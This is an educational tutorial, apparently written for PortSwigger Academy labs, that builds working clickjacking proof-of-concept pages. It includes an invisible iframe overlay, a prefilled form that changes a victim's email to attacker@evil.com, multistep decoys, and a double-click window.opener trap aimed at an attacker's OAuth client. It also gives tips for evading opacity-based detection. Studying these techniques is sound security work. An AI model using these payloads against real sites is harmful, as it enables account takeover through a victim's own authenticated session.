# 02 — Building a Working Clickjacking PoC, Piece by Piece

This file builds each PoC variant from File 01 from the ground up. Every property in
every snippet is explained — the goal is that you understand exactly why each line is
there, not just that copying it works.

## 2.1 — The Basic Overlay PoC

This is the foundational template almost every other variant is built from.

```html
<head>
<style>
  #target_website {
    position: relative;
    width: 128px;
    height: 128px;
    opacity: 0.00001;
    z-index: 2;
  }
  #decoy_website {
    position: absolute;
    width: 300px;
    height: 400px;
    z-index: 1;
  }
</style>
</head>
<body>
  <div id="decoy_website">
    ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```

### Property-by-property breakdown

- **`#target_website { position: relative; }`** — The iframe needs a positioning
  context so its `z-index` actually applies and so its `width`/`height` are respected
  exactly as set, rather than being subject to the browser's default iframe sizing
  behavior.
- **`width: 128px; height: 128px;`** — These define the clickable "hot zone" of the
  framed page. In a real attack you size this to the exact pixel dimensions of the
  target button you're trying to trick the user into clicking, not the whole page —
  oversizing the iframe risks exposing other clickable elements the victim might
  accidentally trigger instead of the one you want.
- **`opacity: 0.00001;`** — This is the core deception mechanism. An opacity of exactly
  `0` is sometimes detected and blocked by browser/extension-level clickjacking
  protections (some heuristics flag `opacity: 0` specifically). Using a near-zero but
  non-zero value like `0.00001` renders the iframe content invisible to the human eye
  while technically not being "fully transparent," which can evade naive
  opacity-threshold detection. (Note: modern Chrome does have transparency-threshold
  detection for iframes in some contexts — this is a moving target and should always be
  tested against the current target browser, not assumed.)
- **`z-index: 2;`** on the iframe and **`z-index: 1;`** on the decoy — this stacking
  order is intentional and important: the iframe is stacked *above* the decoy content
  in the DOM rendering order, even though it's invisible. This is what makes the click
  actually land on the iframe's content rather than on the decoy `div` beneath it. If
  you got the z-index backwards, the click would hit the decoy and nothing in the
  iframe would ever receive the event.
- **`#decoy_website { position: absolute; }`** — Absolute positioning relative to the
  nearest positioned ancestor (or the viewport, if none) lets you place the decoy
  content at an exact pixel location so it lines up precisely under the invisible
  target button.
- **The iframe `src`** — points directly at the real, live target page. This is not a
  copy or a mockup — the victim's browser actually loads the genuine page, with the
  genuine session cookies attached if the victim is logged in. This is why the attack
  works even against pages with strong server-side input validation: the request truly
  is legitimate from the server's point of view.

### The PortSwigger-style template (used across most Academy labs)

PortSwigger's own labs use a near-identical but more parameterized version of the same
template:

```html
<style>
  iframe {
    position: relative;
    width: $width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  div {
    position: absolute;
    top: $top_value;
    left: $side_value;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

The difference from the generic template is that `top` and `left` are added explicitly
to the `div` rule, because here the decoy text/button is a simple inline element rather
than a full styled "fake page" — `top`/`left` give you fine pixel-level control to nudge
the decoy until it sits exactly over the real button inside the iframe.

### Workflow for aligning the overlay in practice

1. Start with a **visible** opacity (e.g. `0.1`) so you can see both layers while
   aligning them.
2. Adjust `top` / `left` on the decoy div, and `width` / `height` on the iframe, until
   the decoy text sits exactly on top of the real target button.
3. Hover over the decoy and confirm the cursor changes to a pointer/hand — this
   confirms the click target underneath is actually clickable, i.e. your alignment is
   correct and you're not just hovering empty iframe space.
4. Only once alignment is confirmed, drop the opacity to a near-zero value
   (`0.00001`–`0.0001`) for the final delivered exploit.
5. **Never click the real button yourself while testing** — on most Academy labs this
   triggers the sensitive action prematurely and can break/reset the lab state.

## 2.2 — Prefilled Form Input Variant

Builds on 2.1, but the iframe `src` itself carries attacker-controlled values:

```html
<style>
  .visible {
    position: absolute;
    top: 0px;
    left: 0px;
    z-index: 1;
  }
  .overlaid-iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
</style>
<div class="visible">Click me</div>
<iframe class="overlaid-iframe"
        src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@evil.com">
</iframe>
```

### What's different here, and why it matters

- The **only** functional change from 2.1 is the query string appended to the iframe
  `src`. This works because the target application reads GET parameters and uses them
  to prepopulate form fields on page load — a convenience feature (e.g. for
  pre-filling a known email during signup flows) that becomes a vulnerability multiplier
  when combined with framing.
- The attack no longer just tricks the user into clicking a button — it tricks them
  into submitting **attacker-chosen data** through their own authenticated session.
  This is the difference between "user accidentally deletes their account" (annoying)
  and "user's account recovery email is silently changed to one the attacker controls"
  (full account takeover via subsequent password reset).
- This is a good example of why clickjacking severity should always be assessed
  against the *specific* action exposed, not treated as a fixed-severity bug class.

## 2.3 — Multistep Clickjacking PoC

For flows that require more than one click (e.g. a confirmation dialog), you stack
multiple decoy elements, each aligned to a different click target inside the same
iframe:

```html
<style>
  iframe {
    position: relative;
    width: $width_value;
    height: $height_value;
    opacity: $opacity;
    z-index: 2;
  }
  .firstClick, .secondClick {
    position: absolute;
    top: $top_value1;
    left: $side_value1;
    z-index: 1;
  }
  .secondClick {
    top: $top_value2;
    left: $side_value2;
  }
</style>
<div class="firstClick">Step 1</div>
<div class="secondClick">Step 2</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

### Breakdown

- `.firstClick` and `.secondClick` share the same base rule (so you only define
  `position: absolute; z-index: 1;` once), then `.secondClick` overrides `top`/`left`
  to reposition it at the second target location. This avoids repeating CSS
  unnecessarily and keeps the two decoy elements logically grouped.
- The two `div`s don't have to be visible simultaneously — in a real attack you'd
  typically reveal "Step 2" only after detecting (or simply timing) the first click,
  using a small script to toggle visibility, so the victim's decoy narrative makes
  sense (e.g. "click once to confirm, click again to proceed").
- The iframe itself doesn't change between steps; only the visible decoy overlay
  changes to point at a different coordinate inside the same underlying page, because
  the underlying multi-step flow happens entirely within the one framed page/session.
- Multistep attacks are inherently more fragile: any change in page layout, button
  position, or load timing on the target breaks alignment. In real engagements this is
  usually demonstrated as a proof-of-concept video rather than relied upon as a
  reliably repeatable automated exploit.

## 2.4 — Double-Clickjacking PoC (No Iframe)

This variant is structurally different — there is no iframe at all. It exploits the
timing gap between the `mousedown` and `click`/`mouseup` events that make up a single
double-click.

```html
<!-- Step 1: attacker page with the lure -->
<button onclick="openTrap()">Claim your reward</button>

<script>
function openTrap() {
  // Opens a new top-level window the victim believes is part of the same flow
  const trapWindow = window.open("https://attacker.example/trap.html", "_blank",
    "width=400,height=300");
}
</script>
```

```html
<!-- trap.html: loaded in the new window -->
<body>
  <h2>Verify you're human</h2>
  <p>Double-click the button below to continue</p>
  <button id="bait">Verify</button>

  <script>
    document.getElementById('bait').addEventListener('mousedown', function () {
      // Fires the instant the FIRST half of the second click begins —
      // before the click event (mouseup) has even completed.
      window.opener.location = "https://real-target.example/oauth/authorize?client_id=attacker";
      window.close();
    });
  </script>
</body>
```

### Why this works, mechanically

- A double-click is not one event — it is `mousedown` → `mouseup`/`click` →
  `mousedown` → `mouseup`/`click`, happening in rapid succession. Humans perceive this
  as one fluid action, but the browser fires discrete events for each phase.
- The trap window listens for `mousedown` specifically — the very first signal that the
  victim has begun their second click — rather than waiting for the full `click` event
  to complete.
- The instant `mousedown` fires, the script does two things almost simultaneously:
  redirects the **opener** window (the original tab, still open behind/beneath the trap)
  to the real sensitive target page, and closes the trap window itself.
- Because window-closing and navigation happen faster than the human click gesture
  completes, the second half of the victim's click (`mouseup`) lands not on the now-gone
  trap window, but on whatever is now in that exact screen location — which is the real
  target page's sensitive button (e.g. an OAuth "Authorize" button), now genuinely
  focused and on top, because the trap window just vacated that space.
- Critically: **no iframe was ever used.** The final click is a direct, top-level,
  same-window interaction with the real origin. `X-Frame-Options` and CSP
  `frame-ancestors` only constrain whether a page *can be framed* — they say nothing
  about window-opener navigation timing, so they are structurally irrelevant here. This
  is covered further in File 03.

### Practical PoC notes

- Precise timing is the hard part of building a reliable double-clickjacking PoC —
  the window-close/navigate logic must complete within the (very short) gap between a
  human's two clicks, which varies by user and input device. Real-world PoCs typically
  need testing across multiple double-click speeds.
- The defensive countermeasure researchers have proposed is disabling sensitive buttons
  by default and only re-enabling them after a deliberate, distinct user gesture (not a
  rapid double-click) — this is discussed in File 03.

## 2.5 — Using Burp's Clickbandit Instead of Hand-Writing CSS

For real engagements, manually tuning pixel offsets is slow. Burp Suite Professional
includes **Clickbandit**, a tool that lets you perform the desired clickjacking action
directly in your own browser against the target page, then automatically generates a
working HTML overlay PoC for you — no hand-written CSS required. This is the
industry-standard approach for producing PoCs quickly during a live engagement; manual
CSS construction (as shown above) remains essential to actually *understand* what
Clickbandit is generating, and is often still necessary for the more unusual variants
(prefilled-form, multistep, double-clickjacking) that go beyond Clickbandit's default
single-click capture model.

Next: `03-bypass-scenarios-partial-protections.md` covers how to defeat partial or
misconfigured defenses against everything built in this file.
